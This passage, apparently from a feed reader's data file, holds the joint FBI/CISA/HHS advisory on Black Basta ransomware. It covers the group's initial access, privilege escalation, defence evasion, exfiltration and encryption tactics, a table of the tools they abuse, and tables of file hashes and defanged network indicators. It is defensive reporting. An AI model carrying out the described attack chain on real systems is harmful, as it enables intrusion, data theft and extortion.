<li>Select an ATT&amp;CK technique described in this advisory (see Tables 2-6).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3><strong>REFERENCES</strong></h3>
<ol>
<li><a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">SentinelOne: Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor</a></li>
<li><a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta\" title=\"Ransomware Spotlight - Black Basta\">Trend Micro: Ransomware Spotlight - Black Basta</a></li>
<li><a href=\"https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\" title=\"Black Basta - Technical Analysis\">Kroll: Black Basta - Technical Analysis</a></li>
<li><a href=\"https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/black-basta\" title=\"Who Is Black Basta?\">Who Is Black Basta? (blackberry.com)</a></li>
<li><a href=\"https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\" title=\"Threat Assessment - Black Basta Ransomware\">Palo Alto Networks: Threat Assessment - Black Basta Ransomware</a></li>
</ol>
<h3><strong>REPORTING</strong></h3>
<p>Your organization has no obligation to respond or provide information back to FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>FBI, CISA, and HHS do not encourage paying ransom as payment does not guarantee victim files will be&nbsp;recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to FBI’s&nbsp;<a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complain Center\">Internet Crime Complain Center (IC3)</a>, a local FBI <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">Field Office</a>, or CISA via the agency’s&nbsp;<a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or by calling 1-844-Say-CISA [1-844-729-2472]).</p>
<h3><strong>DISCLAIMER</strong></h3>
<p>The information in this report is being provided “as is” for informational purposes only. FBI, CISA, HHS, and MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, HHS, and MS-ISAC.</p>
<h3><strong>VERSION HISTORY</strong></h3>
<p><strong>May 10, 2024:</strong> Initial version.</p>
</div>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a" (26173 58013) new 9 nil nil ((title nil "#StopRansomware: Black Basta") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a") (description nil "<h3><strong>SUMMARY</strong></h3>
<p><em><strong>Note</strong>: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Department of Health and Human Services (HHS), and Multi-State Information Sharing and Analysis Center (MS-ISAC) (hereafter referred to as the authoring organizations)&nbsp;are releasing this joint CSA to provide information on Black Basta, a ransomware variant whose actors have encrypted and stolen data from at least 12 out of 16 critical infrastructure sectors, including the Healthcare and Public Health (HPH) Sector.</p>
<p>This joint CSA provides TTPs and IOCs obtained from FBI investigations and third-party reporting. Black Basta is considered a ransomware-as-a-service (RaaS) variant and was first identified in April 2022.&nbsp;Black Basta affiliates have impacted a wide range of businesses and critical infrastructure in North America, Europe, and Australia. As of May 2024, Black Basta affiliates have impacted over 500 organizations globally.</p>
<p>Black Basta affiliates use common initial access techniques—such as phishing and exploiting known vulnerabilities—and then employ a double-extortion model, both encrypting systems and exfiltrating data. Ransom notes do not generally include an initial ransom demand or payment instructions. Instead, the notes provide victims with a unique code and instructs them to contact the ransomware group via a&nbsp;<code>.onion</code> URL (reachable through the Tor browser). Typically, the ransom notes give victims between 10 and 12 days to pay the ransom before the ransomware group publishes their data on the Black Basta TOR site, Basta News.</p>
<p>Healthcare organizations are attractive targets for cybercrime actors due to their size, technological dependence, access to personal health information, and unique impacts from patient care disruptions. The authoring organizations urge HPH Sector and all critical infrastructure organizations to apply the recommendations in the&nbsp;Mitigations section of this CSA to reduce the likelihood of compromise from Black Basta and other ransomware attacks. Victims of ransomware should report the incident to their local FBI field office or CISA (see the Reporting section for contact information).</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/aa24-131a-joint-csa-stopransomware-black-basta_2.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-131A #StopRansomware: Black Basta</a>
    <span class=\"c-file__size\">(PDF,       613.62 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-131a-joint-csa-stopransomware-black-basta_1_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-131A #StopRansomware: Black Basta - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       621.68 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-05/AA24-131A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-131A STIX XML</a>
    <span class=\"c-file__size\">(XML,       237.45 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-05/AA24-131A-StopRansomware-Black-Basta.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-131A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       180.78 KB
  )</span>
  </div>
</div>
<h3><strong>TECHNICAL DETAILS</strong></h3>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<h4><strong>Initial Access</strong></h4>
<p>Black Basta affiliates primarily use spearphishing [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566</a>] to obtain initial access. According to cybersecurity researchers, affiliates have also used <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-242a\" title=\"Identification and Disruption of QakBot Infrastructure\">Qakbot</a> during initial access.[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>]</p>
<p>Starting in February 2024, Black Basta affiliates began exploiting ConnectWise vulnerability <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1709\" title=\"CVE-2024-1709\">CVE-2024-1709</a> [<a href=\"https://cwe.mitre.org/data/definitions/288.html\" title=\"CWE-288: Authentication Bypass Using an Alternate Path or Channel\">CWE-288</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>]. In some instances, affiliates have been observed abusing valid credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].</p>
<h4><strong>Discovery and Execution</strong></h4>
<p>Black Basta affiliates use tools such as SoftPerfect network scanner (<code>netscan.exe</code>) to conduct network scanning. Cybersecurity researchers have observed affiliates conducting reconnaissance using utilities with innocuous file names such as <code>Intel</code> or <code>Dell</code>, left in the root drive <code>C:\\</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>].[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>]</p>
<h4><strong>Lateral Movement</strong></h4>
<p>Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement. Some affiliates also use tools like Splashtop, Screen Connect, and Cobalt Strike beacons to assist with remote access and lateral movement.</p>
<h4><strong>Privilege Escalation and Lateral Movement</strong></h4>
<p>Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation. According to cybersecurity researchers, Black Basta affiliates have also exploited ZeroLogon (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1472\" title=\"CVE-2020-1472\">CVE-2020-1472</a>, [<a href=\"https://cwe.mitre.org/data/definitions/330.html\" title=\"CWE-330: Use of Insufficiently Random Values\">CWE-330</a>]), NoPac (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-42278\" title=\"CVE-2021-42278\">CVE-2021-42278</a> [<a href=\"https://cwe.mitre.org/data/definitions/20.html\" title=\"CWE-20: Improper Input Validation\">CWE-20</a>] and <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-42287\" title=\"CVE-2021-42287\">CVE-2021-42287</a> [<a href=\"https://cwe.mitre.org/data/definitions/269.html\" title=\"CWE-269: Improper Privilege Management\">CWE-269</a>]), and PrintNightmare (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34527\" title=\"CVE-2021-34527\">CVE-2021-34527</a>, [<a href=\"https://cwe.mitre.org/data/definitions/269.html\" title=\"CWE-269: Improper Privilege Management\">CWE-269</a>]) vulnerabilities for local and Windows Active Domain privilege escalation [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>].[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>],[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta\" title=\"Ransomware Spotlight: Black Basta\">2</a>]</p>
<h4><strong>Exfiltration and Encryption</strong></h4>
<p>Black Basta affiliates use RClone to facilitate data exfiltration prior to encryption. Prior to exfiltration,&nbsp;cybersecurity researchers have observed Black Basta affiliates using PowerShell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>] to disable antivirus products, and in some instances, deploying a tool called Backstab, designed to disable endpoint detection and response (EDR) tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].[<a href=\"https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\" title=\"Black Basta - Technical Analysis\">3</a>] Once antivirus programs are terminated, a ChaCha20 algorithm with an RSA-4096 public key fully encrypts files [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. A&nbsp;<code>.basta</code> or otherwise random file extension is added to file names and a ransom note titled&nbsp;<code>readme.txt</code> is left on the compromised system.[<a href=\"https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/black-basta\" title=\"Who Is Black Basta?\">4</a>] To further inhibit system recovery, affiliates use the&nbsp;<code>vssadmin.exe</code> program to delete volume shadow copies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>].[<a href=\"https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\" title=\"Threat Assessment: Black Basta Ransomware\">5</a>]</p>
<h4><strong>Leveraged Tools</strong></h4>
<p>See&nbsp;Table 1 for publicly available tools and applications&nbsp;used by Black Basta affiliates. This includes legitimate tools repurposed for their operations.</p>
<p><strong>Disclaimer:</strong> Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Used by Black Basta Affiliates</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Tool Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSAdmin</td>
<td>A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.</td>
</tr>
<tr>
<td>Cobalt Strike</td>
<td>A penetration testing tool used by security professions to test the security of networks and systems. Black Basta affiliates have used it to assist with lateral movement and file execution.</td>
</tr>
<tr>
<td>Mimikatz</td>
<td>A tool that allows users to view and save authentication credentials such as Kerberos tickets. Black Basta affiliates have used it to aid in privilege escalation.</td>
</tr>
<tr>
<td>PSExec</td>
<td>A tool designed to run programs and execute commands on remote systems.</td>
</tr>
<tr>
<td>PowerShell</td>
<td>A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td>RClone</td>
<td>A command line program used to sync files with cloud storage services such as Mega.</td>
</tr>
<tr>
<td>SoftPerfect</td>
<td>A network scanner (<code>netscan.exe</code>) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.&nbsp;</td>
</tr>
<tr>
<td>ScreenConnect</td>
<td>Remote support, access, and meeting software that allows users to control devices remotely over the internet.</td>
</tr>
<tr>
<td>Splashtop</td>
<td>Remote desktop software that allows remote access to devices for support, access, and collaboration.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Black Basta affiliates have used it to transfer data from a compromised network to actor-controlled accounts.</td>
</tr>
</tbody>
</table>
<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>
<p>See Tables 2–6&nbsp;for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Black Basta ATT&amp;CK Techniques for Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Phishing</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a></td>
<td>Black Basta affiliates have used spearphishing emails to obtain initial access.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v12/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>Black Basta affiliates have exploited ConnectWise vulnerability <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1709\" title=\"CVE-2024-1709\">CVE-2024-1709</a> to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Black Basta ATT&amp;CK Techniques for Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation for Privilege Escalation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a></td>
<td>Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Black Basta ATT&amp;CK Techniques for Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a></td>
<td>Black Basta affiliates have conducted reconnaissance using utilities with innocuous file names, such as <code>Intel</code> or <code>Dell</code>, to evade detection.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>
<p>Black Basta affiliates have deployed a tool called Backstab to disable endpoint detection and response (EDR) tooling.</p>
<p>Black Basta affiliates have used PowerShell to disable antivirus products.</p>
</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Black Basta ATT&amp;CK Techniques for Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>Black Basta affiliates have used PowerShell to disable antivirus products.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Black Basta ATT&amp;CK Techniques for Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>Black Basta affiliates have used the vssadmin.exe program to delete shadow copies.&nbsp;</td>
</tr>
<tr>
<td>Data Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>Black Basta affiliates have used a public key to fully encrypt files.&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
<h3><strong>INDICATORS OF COMPROMISE</strong></h3>
<p>See Table 7 for IOCs obtained from FBI investigations.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Malicious Files Associated with Black Basta Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0112e3b20872760dda5f658f6b546c85f126e803e27f0577b294f335ffa5a298</td>
<td>rclone.exe</td>
</tr>
<tr>
<td>d3683beca3a40574e5fd68d30451137e4a8bbaca8c428ebb781d565d6a70385e</td>
<td>Winscp.exe</td>
</tr>
<tr>
<td>88c8b472108e0d79d16a1634499c1b45048a10a38ee799054414613cc9dccccc</td>
<td>DLL</td>
</tr>
<tr>
<td>58ddbea084ce18cfb3439219ebcf2fc5c1605d2f6271610b1c7af77b8d0484bd</td>
<td>DLL</td>
</tr>
<tr>
<td>39939eacfbc20a2607064994497e3e886c90cd97b25926478434f46c95bd8ead</td>
<td>DLL</td>
</tr>
<tr>
<td>5b2178c7a0fd69ab00cef041f446e04098bbb397946eda3f6755f9d94d53c221</td>
<td>DLL</td>
</tr>
<tr>
<td>51eb749d6cbd08baf9d43c2f83abd9d4d86eb5206f62ba43b768251a98ce9d3e</td>
<td>DLL</td>
</tr>
<tr>
<td>d15bfbc181aac8ce9faa05c2063ef4695c09b718596f43edc81ca02ef03110d1</td>
<td>DLL</td>
</tr>
<tr>
<td>5942143614d8ed34567ea472c2b819777edd25c00b3e1b13b1ae98d7f9e28d43</td>
<td>DLL</td>
</tr>
<tr>
<td>05ebae760340fe44362ab7c8f70b2d89d6c9ba9b9ee8a9f747b2f19d326c3431</td>
<td>DLL</td>
</tr>
<tr>
<td>a7b36482ba5bca7a143a795074c432ed627d6afa5bc64de97fa660faa852f1a6</td>
<td>DLL</td>
</tr>
<tr>
<td>86a4dd6be867846b251460d2a0874e6413589878d27f2c4482b54cec134cc737</td>
<td>DLL</td>
</tr>
<tr>
<td>07117c02a09410f47a326b52c7f17407e63ba5e6ff97277446efc75b862d2799</td>
<td>DLL</td>
</tr>
<tr>
<td>96339a7e87ffce6ced247feb9b4cb7c05b83ca315976a9522155bad726b8e5be</td>
<td><a>ELF</a></td>
</tr>
<tr>
<td>1c1b2d7f790750d60a14bd661dae5c5565f00c6ca7d03d062adcecda807e1779</td>
<td>ELF</td>
</tr>
<tr>
<td>360c9c8f0a62010d455f35588ef27817ad35c715a5f291e43449ce6cb1986b98</td>
<td>ELF</td>
</tr>
<tr>
<td>0554eb2ffa3582b000d558b6950ec60e876f1259c41acff2eac47ab78a53e94a</td>
<td><a>EXE</a></td>
</tr>
<tr>
<td>9a55f55886285eef7ffabdd55c0232d1458175b1d868c03d3e304ce7d98980bc</td>
<td>EXE</td>
</tr>
<tr>
<td>62e63388953bb30669b403867a3ac2c8130332cf78133f7fd4a7f23cdc939087</td>
<td>EXE</td>
</tr>
<tr>
<td>7ad4324ea241782ea859af12094f89f9a182236542627e95b6416c8fb9757c59</td>
<td>EXE</td>
</tr>
<tr>
<td>350ba7fca67721c74385faff083914ecdd66ef107a765dfb7ac08b38d5c9c0bd</td>
<td>EXE</td>
</tr>
<tr>
<td>90ba27750a04d1308115fa6a90f36503398a8f528c974c5adc07ae8a6cd630e7</td>
<td>EXE</td>
</tr>
<tr>
<td>fafaff3d665b26b5c057e64b4238980589deb0dff0501497ac50be1bc91b3e08</td>
<td>EXE</td>
</tr>
<tr>
<td>acb60f0dd19a9a26aaaefd3326db8c28f546b6b0182ed2dcc23170bcb0af6d8f</td>
<td>EXE</td>
</tr>
<tr>
<td>d73f6e240766ddd6c3c16eff8db50794ab8ab95c6a616d4ab2bc96780f13464d</td>
<td>EXE</td>
</tr>
<tr>
<td>f039eaaced72618eaba699d2985f9e10d252ac5fe85d609c217b45bc8c3614f4</td>
<td>EXE</td>
</tr>
<tr>
<td>723d1cf3d74fb3ce95a77ed9dff257a78c8af8e67a82963230dd073781074224</td>
<td>EXE</td>
</tr>
<tr>
<td>ae7c868713e1d02b4db60128c651eb1e3f6a33c02544cc4cb57c3aa6c6581b6e</td>
<td>EXE</td>
</tr>
<tr>
<td>fff35c2da67eef6f1a10c585b427ac32e7f06f4e4460542207abcd62264e435f</td>
<td>EXE</td>
</tr>
<tr>
<td>df5b004be71717362e6b1ad22072f9ee4113b95b5d78c496a90857977a9fb415</td>
<td>EXE</td>
</tr>
<tr>
<td>462bbb8fd7be98129aa73efa91e2d88fa9cafc7b47431b8227d1957f5d0c8ba7</td>
<td>EXE</td>
</tr>
<tr>
<td>3c50f6369f0938f42d47db29a1f398e754acb2a8d96fd4b366246ac2ccbe250a</td>
<td>EXE</td>
</tr>
<tr>
<td>5d2204f3a20e163120f52a2e3595db19890050b2faa96c6cba6b094b0a52b0aa</td>
<td>EXE</td>
</tr>
<tr>
<td>37a5cd265f7f555f2fe320a68d70553b7aa9601981212921d1ac2c114e662004</td>
<td>EXE</td>
</tr>
<tr>
<td>3090a37e591554d7406107df87b3dc21bda059df0bc66244e8abef6a5678af35</td>
<td>EXE</td>
</tr>
<tr>
<td>17879ed48c2a2e324d4f5175112f51b75f4a8ab100b8833c82e6ddb7cd817f20</td>
<td>EXE</td>
</tr>
<tr>
<td>42f05f5d4a2617b7ae0bc601dd6c053bf974f9a337a8fcc51f9338b108811b78</td>
<td>EXE</td>
</tr>
<tr>
<td>882019d1024778e13841db975d5e60aaae1482fcf86ba669e819a68ce980d7d3</td>
<td>EXE</td>
</tr>
<tr>
<td>e28188e516db1bda9015c30de59a2e91996b67c2e2b44989a6b0f562577fd757</td>
<td>EXE</td>
</tr>
<tr>
<td>0a8297b274aeab986d6336b395b39b3af1bb00464cf5735d1ecdb506fef9098e</td>
<td>EXE</td>
</tr>
<tr>
<td>69192821f8ce4561cf9c9cb494a133584179116cb2e7409bea3e18901a1ca944</td>
<td>EXE</td>
</tr>
<tr>
<td>3337a7a9ccdd06acdd6e3cf4af40d871172d0a0e96fc48787b574ac93689622a</td>
<td>EXE</td>
</tr>
<tr>
<td>17205c43189c22dfcb278f5cc45c2562f622b0b6280dcd43cc1d3c274095eb90</td>
<td>EXE</td>
</tr>
<tr>
<td>b32daf27aa392d26bdf5faafbaae6b21cd6c918d461ff59f548a73d447a96dd9</td>
<td>EXE</td>
</tr>
</tbody>
</table>
<p>See Tables 8–11 for IOCs obtained from trusted third-party reporting.</p>
<p><strong>Disclaimer:</strong> The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Network Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>IP Address</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>66.249.66[.]18</td>
<td>0gpw.588027fa.dns.realbumblebee[.]net, dns.trailshop[.]net, dns.artspathgroupe[.]net</td>
</tr>
<tr>
<td>66.249.66[.]18</td>
<td>my.2a91c002002.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>66.249.66[.]18</td>
<td>fy9.39d9030e5d3a8e2352daae2f4cd3c417b36f64c6644a783b9629147a1.afd8b8a4615358e0313bad8c544a1af0d8efcec0e8056c2c8eee96c7.b06d1825c0247387e38851b06be0272b0bd619b7c9636bc17b09aa70.a46890f27.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>95.181.173[.]227</td>
<td>adslsdfdsfmo[.]world</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>fy9.36c44903529fa273afff3c9b7ef323432e223d22ae1d625c4a3957d57.015c16eff32356bf566c4fd3590c6ff9b2f6e8c587444ecbfc4bcae7.f71995aff9e6f22f8daffe9d2ad9050abc928b8f93bb0d42682fd3c3.445de2118.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>xkpal.d6597fa.dns.blocktoday.net<br>nuher.3577125d2a75f6a277fc5714ff536c5c6af5283d928a66daad6825b9a.7aaf8bba88534e88ec89251c57b01b322c7f52c7f1a5338930ae2a50.cbb47411f60fe58f76cf79d300c03bdecfb9e83379f59d80b8494951.e10c20f77.7fcc0eb6.dns.blocktoday[.]net</td>
</tr>
<tr>
<td>72.14.196[.]50</td>
<td>.rasapool[.]net, dns.trailshop[.]net</td>
</tr>
<tr>
<td>72.14.196[.]192</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>72.14.196[.]2</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>72.14.196[.]226</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>46.161.27[.]151</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>nuher.1d67bbcf4.456d87aa6.2d84dfba.dns.specialdrills[.]com</td>
</tr>
<tr>
